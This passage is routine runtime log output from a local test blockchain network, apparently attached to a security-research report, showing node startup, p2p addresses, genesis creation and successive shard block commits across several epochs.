[0;32mINFO [0m[2026-10-06 22:13:09.023] [process/block]      [0/4/112/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 112 [0;32mnonce[0m = 109 [0;32mhash[0m = f345e83e89725fbe2d64efa0f7be92e459896dd0b5e3c994f03694779deba00e 
[0;32mINFO [0m[2026-10-06 22:13:15.020] [process/block]      [0/4/113/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 113 [0;32mnonce[0m = 110 [0;32mhash[0m = 4f943afc72543df1df88e8bab5789f34907812e92ee4472dec8588cf57f953f1 
[0;32mINFO [0m[2026-10-06 22:13:21.019] [process/block]      [0/4/114/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 114 [0;32mnonce[0m = 111 [0;32mhash[0m = 09c7f0261d7f8888c63634481d907138843629c129700342f8d5c007293a607f 
[0;32mINFO [0m[2026-10-06 22:13:27.022] [process/block]      [0/4/115/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 115 [0;32mnonce[0m = 112 [0;32mhash[0m = daf1c778ffcca84911d0a0b010bef5ace505641e875d30a2fc03df342c6275cd 
[0;32mINFO [0m[2026-10-06 22:13:33.019] [process/block]      [0/4/116/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 116 [0;32mnonce[0m = 113 [0;32mhash[0m = 2552105ebc45c5ed645d436330de9bde9ac1917698bd72650e6b1ab645f43b58 
[0;32mINFO [0m[2026-10-06 22:13:39.020] [process/block]      [0/4/117/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 117 [0;32mnonce[0m = 114 [0;32mhash[0m = 2af755a6438542af6047e6e12ed3b202ec3cf6842ccad316fe66025bd8a4a40e 
[0;32mINFO [0m[2026-10-06 22:13:45.020] [process/block]      [0/4/118/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 118 [0;32mnonce[0m = 115 [0;32mhash[0m = 4c9163ea7c209b0ec402ce8882c60167e2cfb1342ee67773c62f997a711389a8 
[0;32mINFO [0m[2026-10-06 22:13:51.024] [process/block]      [0/4/119/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 119 [0;32mnonce[0m = 116 [0;32mhash[0m = 9c710ec3423c79d14e555f015ef7a46a8eaacaecdc87f18c4b01db0ea581be3e 
[0;32mINFO [0m[2026-10-06 22:13:57.022] [process/block]      [0/4/120/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 120 [0;32mnonce[0m = 117 [0;32mhash[0m = 135025b050731fbf52a29c6713fa9857c34130f09e62875416028d495e16691b 
[0;32mINFO [0m[2026-10-06 22:14:03.013] [processProxy]       [0/5/121/(BLOCK)] processorProxy                           [0;32mconfigured[0m = 1 
[0;32mINFO [0m[2026-10-06 22:14:03.013] [processProxy]       [0/5/121/(BLOCK)] processorProxy                           [0;32mconfigured[0m = 1 
[0;32mINFO [0m[2026-10-06 22:14:05.140] [process/block]      [0/5/121/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 5 [0;32mshard[0m = 0 [0;32mround[0m = 121 [0;32mnonce[0m = 118 [0;32mhash[0m = ece8dc1f956fb9db80e03d8c821472451f09036203daa9d325fe10db91a9b1a1 
[0;32mINFO [0m[2026-10-06 22:14:05.148] [state]              [0/5/121/(END_ROUND)] starting snapshot                        [0;32mtype[0m = user trie [0;32mrootHash[0m = f50cefa3cc02078d8a54b3274d0a93b3ec3b3ab6a7dcf5ae6c7b2637b315514f [0;32mepoch[0m = 5 
[0;32mINFO [0m[2026-10-06 22:14:09.023] [process/block]      [0/5/122/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 5 [0;32mshard[0m = 0 [0;32mround[0m = 122 [0;32mnonce[0m = 119 [0;32mhash[0m = ad1152637f6c272af3a4ac7f8ba8ebfd9b23e9515c33093ab020f40e46800d16 
[0;32mINFO [0m[2026-10-06 22:14:15.022] [process/block]      [0/5/123/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 5 [0;32mshard[0m = 0 [0;32mround[0m = 123 [0;32mnonce[0m = 120 [0;32mhash[0m = 7acf78ea4b645517c4b7951b2a7e1f37492ee9926ed4d626cda21274a70ae186 
[0;32mINFO [0m[2026-10-06 22:14:21.021] [process/block]      [0/5/124/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 5 [0;32mshard[0m = 0 [0;32mround[0m = 124 [0;32mnonce[0m = 121 [0;32mhash[0m = bc9aa6f3c352f6d061e137ee0dd3f4d910417c3c76322114a3ebeb08d613fa5a 
[0;32mINFO [0m[2026-10-06 22:14:27.020] [process/block]      [0/5/125/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 5 [0;32mshard[0m = 0 [0;32mround[0m = 125 [0;32mnonce[0m = 122 [0;32mhash[0m = 8e73a4e45df464fa7056e956d9270973ed1518a96d9f40ad5e134483902bd834 
[0;32mINFO [0m[2026-10-06 22:14:33.013] [process/block]      [0/5/126/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 5 [0;32mshard[0m = 0 [0;32mround[0m = 126 [0;32mnonce[0m = 123 [0;32mhash[0m = e5290014b14df591eb3c2709822eee2b0347a463003ad3efd057d019393de1ca 
[0;32mINFO [0m[2026-10-06 22:14:34.068] [node]               [0/5/126/(END_ROUND)] terminating at user's signal...          
```

### C 6.0, observer0 full log

File `security-research/node-logs/observer0.log`.

```text
[0;32mINFO [0m[2026-10-06 22:01:39.371] [node]               [/0/0/]        starting node                            [0;32mversion[0m = v1.0.0/go1.26.4/darwin-arm64/3bd876d357 [0;32mpid[0m = 43276 
[0;32mINFO [0m[2026-10-06 22:01:39.374] [factory]            [/0/0/]        start time                               [0;32mformatted[0m = Tue Oct 6 22:01:57 WAT 2026 [0;32munix timestamp[0m = 1791320517 [0;32msupernova unix timestamp[0m = 1791323157 [0;32mround duration[0m = 6s [0;32msupernova round duration[0m = 6s 
[0;32mINFO [0m[2026-10-06 22:01:39.375] [factory]            [/0/0/]        the node loaded the validatorKey.pem file and is running in single-key mode 
[0;32mINFO [0m[2026-10-06 22:01:39.415] [factory]            [/0/0/]        p2p private key: generated a new private key for p2p signing 
[0;32mINFO [0m[2026-10-06 22:01:39.422] [main/p2p]           [/0/0/]        listening on addresses                   [0;32maddr0[0m = /ip4/127.0.0.1/tcp/21100/p2p/16Uiu2HAm8hjqpBUNh2Hx6tWoVhgorQjtcfUQshiU4V7NQghn5iZS [0;32maddr1[0m = /ip4/172.20.10.5/tcp/21100/p2p/16Uiu2HAm8hjqpBUNh2Hx6tWoVhgorQjtcfUQshiU4V7NQghn5iZS 
[0;32mINFO [0m[2026-10-06 22:01:39.422] [main/p2p]           [/0/0/]        started the network discovery process... 
[0;32mINFO [0m[2026-10-06 22:01:59.423] [factory]            [/0/0/]        shard info                               [0;32mstarted in shard[0m = 0 
[0;32mINFO [0m[2026-10-06 22:01:59.428] [factory]            [/0/0/]        bootstrap parameters                     [0;32mshardId[0m = 0 [0;32mepoch[0m = 0 [0;32mnumShards[0m = 1 
[0;32mINFO [0m[2026-10-06 22:01:59.437] [node]               [/0/0/]        Bootstrap                                [0;32mepoch[0m = 0 
[0;32mINFO [0m[2026-10-06 22:02:06.665] [..nodesCoordinator] [0/0/0/]       new nodes config is set for epoch        [0;32mepoch[0m = 0 
[0;32mINFO [0m[2026-10-06 22:02:06.685] [vmContainerFactory] [0/0/0/]       VM 1.5 created                           
[0;32mINFO [0m[2026-10-06 22:02:06.694] [processProxy]       [0/0/0/]       processorProxy                           [0;32mconfigured[0m = 0 
[0;32mINFO [0m[2026-10-06 22:02:09.968] [processProxy]       [0/0/0/]       processorProxy                           [0;32mconfigured[0m = 0 
[0;32mINFO [0m[2026-10-06 22:02:09.976] [genesis/process]    [0/0/0/]       genesisBlockCreator.createHeaders        [0;32mshard[0m = 0 [0;32mnonce[0m = 0 [0;32mround[0m = 0 [0;32mroot hash[0m = 79c9a65d56dd423b42fde0405f173fbaf42d081e4de05780814e509da6664770 
[0;32mINFO [0m[2026-10-06 22:02:09.983] [genesis/process]    [0/0/0/]       genesisBlockCreator.createHeaders        [0;32mshard[0m = 4294967295 [0;32mnonce[0m = 0 [0;32mround[0m = 0 [0;32mroot hash[0m = 5b8c8589b3a99e69f13a0e556ed873b94e6236d4756c19ebd16de6e62792ff8d 
[0;32mINFO [0m[2026-10-06 22:02:10.357] [vmContainerFactory] [0/0/0/]       VM 1.5 created                           
[0;32mINFO [0m[2026-10-06 22:02:10.468] [processProxy]       [0/0/0/]       processorProxy                           [0;32mconfigured[0m = 0 
[0;32mINFO [0m[2026-10-06 22:02:10.471] [factory]            [0/0/0/]       AOT transaction selection enabled        [0;32mcacheSize[0m = 10 [0;32mselectionTimeoutMs[0m = 30000 
[0;32mINFO [0m[2026-10-06 22:02:10.504] [factory]            [0/0/0/]       indexGenesisBlocks(): historyRepo.RecordBlock [0;32mshardID[0m = 0 [0;32mhash[0m = 44c8ad7cae76622aec11467c2c08d55e08eb2168dc1f67baf8108e349e41732d 
[0;32mINFO [0m[2026-10-06 22:02:10.762] [vmContainerFactory] [0/0/0/]       VM 1.5 created                           
[0;32mINFO [0m[2026-10-06 22:02:10.838] [processProxy]       [0/0/0/]       processorProxy                           [0;32mconfigured[0m = 0 
[0;33mWARN [0m[2026-10-06 22:02:10.841] [state]              [0/0/0/]       could not retrieve snapshot info         [0;33merror[0m = key not found 
[0;32mINFO [0m[2026-10-06 22:02:10.845] [factory]            [0/0/0/]       starting consensus                       [0;32mepoch[0m = 0 
[0;32mINFO [0m[2026-10-06 22:02:10.855] [vmContainerFactory] [0/0/2/(START_ROUND)] VM 1.5 created                           
[0;32mINFO [0m[2026-10-06 22:02:10.861] [node]               [0/0/2/(BLOCK)] application is now running               
[0;32mINFO [0m[2026-10-06 22:02:10.973] [processProxy]       [0/0/2/(BLOCK)] processorProxy                           [0;32mconfigured[0m = 0 
[0;32mINFO [0m[2026-10-06 22:02:11.055] [processProxy]       [0/0/2/(BLOCK)] processorProxy                           [0;32mconfigured[0m = 0 
[0;32mINFO [0m[2026-10-06 22:02:11.057] [process/block]      [0/0/2/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 2 [0;32mnonce[0m = 1 [0;32mhash[0m = d5bdd96278b9dbd0f5207b2b83bc0f27043f074c125dc9070489f05efd7348aa 
[0;32mINFO [0m[2026-10-06 22:02:15.012] [process/block]      [0/0/3/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 3 [0;32mnonce[0m = 2 [0;32mhash[0m = 36586d5593d9fbb8f43f889cc78200efed240d8f77671bdb1deea97a72d82e04 
[0;32mINFO [0m[2026-10-06 22:02:21.016] [process/block]      [0/0/4/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 4 [0;32mnonce[0m = 3 [0;32mhash[0m = f7ab2e1fc0e18335e948b13fb3468942c4b09c2d6092eff80e8bd8b179528d67 
[0;32mINFO [0m[2026-10-06 22:02:27.018] [process/block]      [0/0/5/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 5 [0;32mnonce[0m = 4 [0;32mhash[0m = d3545a9a67a0580e3e8f9479a2a8f191a7bdaacddab847f05bedd76065626d3a 
[0;32mINFO [0m[2026-10-06 22:02:33.019] [process/block]      [0/0/6/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 6 [0;32mnonce[0m = 5 [0;32mhash[0m = 9d470069c6137fe2d43a3d458807089baeee6639c070592bff6255b1b46c7070 
[0;32mINFO [0m[2026-10-06 22:02:39.020] [process/block]      [0/0/7/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 7 [0;32mnonce[0m = 6 [0;32mhash[0m = 8022e0edb3f7b3a39cb074302123db3a9817edaa8d99bc51fb9f7e637143e54c 
[0;32mINFO [0m[2026-10-06 22:02:45.016] [process/block]      [0/0/8/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 8 [0;32mnonce[0m = 7 [0;32mhash[0m = 8458e3fdc458619cb5ab4abf4388ee5fbe81d6ec0479c9a4f69b2e5748bd16c1 
[0;32mINFO [0m[2026-10-06 22:02:51.018] [process/block]      [0/0/9/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 9 [0;32mnonce[0m = 8 [0;32mhash[0m = fcc9c238e3c0b8583d0ac32f3fc6d993d69408b046c35359d37fa2a7ba9920aa 
[0;32mINFO [0m[2026-10-06 22:02:57.018] [process/block]      [0/0/10/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 10 [0;32mnonce[0m = 9 [0;32mhash[0m = 3251be20e3a1430b0cb2aaf39abb7d6f68d4743b9bb63ae63b36464a7436fd57 
[0;32mINFO [0m[2026-10-06 22:03:03.012] [process/block]      [0/0/11/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 11 [0;32mnonce[0m = 10 [0;32mhash[0m = d7751e8c75702442ebebd173e134f3bbe2843dc6d63110283d529b518f58d818 
[0;32mINFO [0m[2026-10-06 22:03:09.013] [process/block]      [0/0/12/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 12 [0;32mnonce[0m = 11 [0;32mhash[0m = a5afdd224e6e20c412a9110259ad74fcf5a3cfb4af7bd55c831f847aa9971f6e 
[0;32mINFO [0m[2026-10-06 22:03:15.012] [process/block]      [0/0/13/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 13 [0;32mnonce[0m = 12 [0;32mhash[0m = 3f9e2b17674e22f6c44f9391142afe082368930b3f979a1b0a6ab1ff6db3a2dc 
[0;32mINFO [0m[2026-10-06 22:03:21.020] [process/block]      [0/0/14/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 14 [0;32mnonce[0m = 13 [0;32mhash[0m = 58ec9c87aabf474fee7c30fb5d1b83598bbaddfc16aedc73e089f415b5be7d7a 
[0;32mINFO [0m[2026-10-06 22:03:27.017] [process/block]      [0/0/15/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 15 [0;32mnonce[0m = 14 [0;32mhash[0m = da363faaef0e970e4a6f0dff6ae4902d014556b192495b8ad4c7e66dcd56fea3 
[0;32mINFO [0m[2026-10-06 22:03:33.015] [process/block]      [0/0/16/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 16 [0;32mnonce[0m = 15 [0;32mhash[0m = cc0a413ba2c205daf2a926df638df38d865b29aa5bb5e544e62658874ece68e7 
[0;32mINFO [0m[2026-10-06 22:03:39.019] [process/block]      [0/0/17/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 17 [0;32mnonce[0m = 16 [0;32mhash[0m = 7a1fca6d7e7d454798cbc4da4b88665dac5b4afeb426b5d67299f63157e79567 
[0;32mINFO [0m[2026-10-06 22:03:45.018] [process/block]      [0/0/18/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 18 [0;32mnonce[0m = 17 [0;32mhash[0m = a24bcbbb118cca329fe797216f78d8ed81cb5f67460e5a8e08104ad47d1ed483 
[0;32mINFO [0m[2026-10-06 22:03:51.019] [process/block]      [0/0/19/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 19 [0;32mnonce[0m = 18 [0;32mhash[0m = 1d440629ecaab36c1d1995c866f4525fab933d4933c0abb50eee4664c42251ce 
[0;32mINFO [0m[2026-10-06 22:03:57.018] [process/block]      [0/0/20/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 20 [0;32mnonce[0m = 19 [0;32mhash[0m = d5edaee92782c5150a9e8a5bcf9d59077440de006d3446df18f039f115e05fc1 
[0;32mINFO [0m[2026-10-06 22:04:03.019] [process/block]      [0/0/21/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 21 [0;32mnonce[0m = 20 [0;32mhash[0m = e88f671ee60e08ecf0471ca0b7411370ecd0b70cc58ad88b9862be9cd3dcb3a1 
[0;32mINFO [0m[2026-10-06 22:04:09.016] [process/block]      [0/0/22/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 22 [0;32mnonce[0m = 21 [0;32mhash[0m = 5f6dd2ec590bcaa8bb39195e9bd4794405995ad00d0092516217692c88243d6c 
[0;32mINFO [0m[2026-10-06 22:04:15.019] [process/block]      [0/0/23/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 23 [0;32mnonce[0m = 22 [0;32mhash[0m = 18578d86977b586cbce97167926e717ded597fb2230d2bceb4f2dfabf63a8b60 
[0;32mINFO [0m[2026-10-06 22:04:21.015] [process/block]      [0/0/24/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 24 [0;32mnonce[0m = 23 [0;32mhash[0m = 18bd49d3bbda56fe4e5564ae770d51511fda48a83dd39feb84d7ce77fd7ff9ab 
[0;32mINFO [0m[2026-10-06 22:04:27.016] [process/block]      [0/0/25/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 25 [0;32mnonce[0m = 24 [0;32mhash[0m = 34a7ea4de92180120f258f31622f7ea73777251a1aaa88b6ca06193d214e50cb 
[0;32mINFO [0m[2026-10-06 22:04:33.021] [process/block]      [0/0/26/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 26 [0;32mnonce[0m = 25 [0;32mhash[0m = 579e849de660393f9617fd08724e0bc658fa49c9607bc009ab625706d5279eca 
[0;32mINFO [0m[2026-10-06 22:04:39.017] [processProxy]       [0/1/27/(BLOCK)] processorProxy                           [0;32mconfigured[0m = 1 
[0;32mINFO [0m[2026-10-06 22:04:39.018] [processProxy]       [0/1/27/(BLOCK)] processorProxy                           [0;32mconfigured[0m = 1 
[0;32mINFO [0m[2026-10-06 22:04:49.913] [process/block]      [0/1/28/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 28 [0;32mnonce[0m = 26 [0;32mhash[0m = f9c7d6f5851cd6f918d56c686bb639c5371f3c457f4a972b637c72d0b814e166 
[0;32mINFO [0m[2026-10-06 22:04:49.913] [state]              [0/1/28/(END_ROUND)] starting snapshot                        [0;32mtype[0m = user trie [0;32mrootHash[0m = 79c9a65d56dd423b42fde0405f173fbaf42d081e4de05780814e509da6664770 [0;32mepoch[0m = 1 
[0;32mINFO [0m[2026-10-06 22:04:51.026] [process/block]      [0/1/29/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 29 [0;32mnonce[0m = 27 [0;32mhash[0m = d72db60a3ba3f76f2e43bd6f2671a89840e19b8eb399aacdc337926acbbdb0de 
[0;32mINFO [0m[2026-10-06 22:04:57.023] [process/block]      [0/1/30/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 30 [0;32mnonce[0m = 28 [0;32mhash[0m = d41b91c520c1a19432fda0bdd0ff5a20b52d27bb744a67f219059a88d257ad6f 
[0;32mINFO [0m[2026-10-06 22:04:58.536] [txsSender]          [0/1/30/(END_ROUND)] sent transactions on network             [0;32mmax/sec[0m = 1 [0;32mtotal[0m = 1 
[0;32mINFO [0m[2026-10-06 22:05:03.015] [process/block]      [0/1/31/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 31 [0;32mnonce[0m = 29 [0;32mhash[0m = e097f2f6af1a03acf564fd1db08a79de52cf21a1b3304c3e605d7cf199f7d8e3 
[0;32mINFO [0m[2026-10-06 22:05:09.020] [process/block]      [0/1/32/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 32 [0;32mnonce[0m = 30 [0;32mhash[0m = b30735c1b534124f21adaa8cb55ff08e9ae5dcc0ab664c0b59326eb30fe2ae29 
[0;32mINFO [0m[2026-10-06 22:05:19.539] [txsSender]          [0/1/33/(END_ROUND)] sent transactions on network             [0;32mmax/sec[0m = 1 [0;32mtotal[0m = 2 
[0;32mINFO [0m[2026-10-06 22:05:21.413] [process/block]      [0/1/34/(START_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 33 [0;32mnonce[0m = 31 [0;32mhash[0m = 26ee8731261ba47e54827e21ee512223dbc3d34c6fd4d3fb2b1994b3c3b609b7 
[0;32mINFO [0m[2026-10-06 22:05:21.419] [process/block]      [0/1/34/(START_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 34 [0;32mnonce[0m = 32 [0;32mhash[0m = fad1e91ddfbe5276917e94129538fb7e0bb4773f7fef1b90670d6b2a09acae4d 
[0;32mINFO [0m[2026-10-06 22:05:27.021] [process/block]      [0/1/35/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 35 [0;32mnonce[0m = 33 [0;32mhash[0m = f5341383ffa39c91eec82579b5ff574f85b51d3ddc580fb8199e0a1536637e12 
[0;32mINFO [0m[2026-10-06 22:05:33.023] [process/block]      [0/1/36/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 36 [0;32mnonce[0m = 34 [0;32mhash[0m = 61ea7b42c995e12be99bd59668db8f48b449216f05ef8a7f5b91a9a9c3b2fd79 
[0;32mINFO [0m[2026-10-06 22:05:39.018] [process/block]      [0/1/37/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 37 [0;32mnonce[0m = 35 [0;32mhash[0m = a3e5c96e7d34fc453e171c92ba4ee5559674951d6d77dd77885fee512599f613 
[0;32mINFO [0m[2026-10-06 22:05:40.542] [txsSender]          [0/1/37/(END_ROUND)] sent transactions on network             [0;32mmax/sec[0m = 1 [0;32mtotal[0m = 4 
[0;32mINFO [0m[2026-10-06 22:05:45.015] [process/block]      [0/1/38/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 38 [0;32mnonce[0m = 36 [0;32mhash[0m = cd6646c16b5d7b2f1c881b600412c4921ca59a7b400227a7b8c81bec5a360fc0 
[0;32mINFO [0m[2026-10-06 22:05:51.029] [process/block]      [0/1/39/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 39 [0;32mnonce[0m = 37 [0;32mhash[0m = 85471babb00c8eaed4f1b0863d262b337b72a43c1c0a8c9cb7ec299c8da44da5 
[0;32mINFO [0m[2026-10-06 22:05:57.029] [process/block]      [0/1/40/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 40 [0;32mnonce[0m = 38 [0;32mhash[0m = 3a4c5a6fdc068112bc997093d2145763fd9f979132d6b208b439d18e44d056d6 
[0;32mINFO [0m[2026-10-06 22:06:01.544] [txsSender]          [0/1/40/(END_ROUND)] sent transactions on network             [0;32mmax/sec[0m = 1 [0;32mtotal[0m = 6 
[0;32mINFO [0m[2026-10-06 22:06:03.025] [process/block]      [0/1/41/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 41 [0;32mnonce[0m = 39 [0;32mhash[0m = 7be317ad062b3ee2e48b6f3cac5a5081936ffec302ca083dda1da1182539c5a1 
[0;32mINFO [0m[2026-10-06 22:06:18.003] [process/block]      [0/1/43/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 43 [0;32mnonce[0m = 40 [0;32mhash[0m = 62ade4e48f729a692e13c9707173bf008d42e7337630fe0ad0e8a21ffd695047 
[0;32mINFO [0m[2026-10-06 22:06:21.034] [process/block]      [0/1/44/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 44 [0;32mnonce[0m = 41 [0;32mhash[0m = b24399f37dff235d8252e514d4c6d94dc10a0f6b2dbcb0c3264bea9c1fbc47f3 
[0;32mINFO [0m[2026-10-06 22:06:22.546] [txsSender]          [0/1/44/(END_ROUND)] sent transactions on network             [0;32mmax/sec[0m = 1 [0;32mtotal[0m = 7 
[0;32mINFO [0m[2026-10-06 22:06:27.024] [process/block]      [0/1/45/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 45 [0;32mnonce[0m = 42 [0;32mhash[0m = ac6ea7dba63d2ca816bc09e57aa56beda2fc89c311681cf8d6572c5f19410be1 
[0;32mINFO [0m[2026-10-06 22:06:33.019] [process/block]      [0/1/46/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 46 [0;32mnonce[0m = 43 [0;32mhash[0m = 8036e413b7f84717e241205304b6967a6b42372145db3574b49a3fdd8f69d415 
[0;32mINFO [0m[2026-10-06 22:06:39.019] [process/block]      [0/1/47/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 47 [0;32mnonce[0m = 44 [0;32mhash[0m = d433f3c0bdfb6977a790d1d3ba60abf059e18a00f120f0ea3af009c590ffcc1a 
[0;32mINFO [0m[2026-10-06 22:06:43.548] [txsSender]          [0/1/47/(END_ROUND)] sent transactions on network             [0;32mmax/sec[0m = 1 [0;32mtotal[0m = 9 
[0;32mINFO [0m[2026-10-06 22:06:45.026] [process/block]      [0/1/48/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 48 [0;32mnonce[0m = 45 [0;32mhash[0m = 8d284ab63355d3fdc06361b7373d055ea9b0a8b8f7725c20e3db60e136e2cb48 
[0;32mINFO [0m[2026-10-06 22:06:51.028] [process/block]      [0/1/49/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 49 [0;32mnonce[0m = 46 [0;32mhash[0m = cc29082633c650dd24e6a36d6c27b67b25c15c39f5a4284a8efebf8437d83c98 
[0;32mINFO [0m[2026-10-06 22:06:57.023] [process/block]      [0/1/50/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 50 [0;32mnonce[0m = 47 [0;32mhash[0m = f93f78d1b87acffc2b890caf5f53e20d5b9478086b85d7cf1897fdb507127622 
[0;32mINFO [0m[2026-10-06 22:07:03.022] [process/block]      [0/1/51/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 51 [0;32mnonce[0m = 48 [0;32mhash[0m = 754796a81a99a5e8b504cee5e13aa086f9156c4ddc472380caf32c1d1f05c408 
[0;32mINFO [0m[2026-10-06 22:07:04.552] [txsSender]          [0/1/51/(END_ROUND)] sent transactions on network             [0;32mmax/sec[0m = 1 [0;32mtotal[0m = 11 
[0;32mINFO [0m[2026-10-06 22:07:09.009] [processProxy]       [0/2/52/(BLOCK)] processorProxy                           [0;32mconfigured[0m = 1 
[0;32mINFO [0m[2026-10-06 22:07:09.009] [processProxy]       [0/2/52/(BLOCK)] processorProxy                           [0;32mconfigured[0m = 1 
[0;32mINFO [0m[2026-10-06 22:07:09.022] [process/block]      [0/2/52/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 52 [0;32mnonce[0m = 49 [0;32mhash[0m = 2eeb4c93b92261f08f33f8ec3a4858e6f1e84d60d6ea643d77e031e15849f202 
[0;33mWARN [0m[2026-10-06 22:07:09.764] [process/block]      [0/2/52/(END_ROUND)] saveMetaHeader                           [0;33melapsed time[0m = 736.267125ms 
[0;32mINFO [0m[2026-10-06 22:07:09.816] [state]              [0/2/52/(END_ROUND)] starting snapshot                        [0;32mtype[0m = user trie [0;32mrootHash[0m = a518a5c28291a61b129dfd908f2492adb0ac4f9425d9adc0fc072e39a59d2f0f [0;32mepoch[0m = 2 
